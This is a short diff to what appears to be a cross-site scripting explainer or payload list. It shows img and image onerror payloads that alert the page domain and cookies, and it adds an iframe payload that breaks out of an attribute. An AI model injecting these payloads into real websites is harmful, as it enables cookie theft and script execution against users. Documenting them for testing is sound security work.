@@ -33,3 +33,5 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 
 <img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
 <image src=1 href=1 onerror="javascript:alert(document.cookie)"></image>
+
+"><iframe src="JavaScript:alert(1)";>
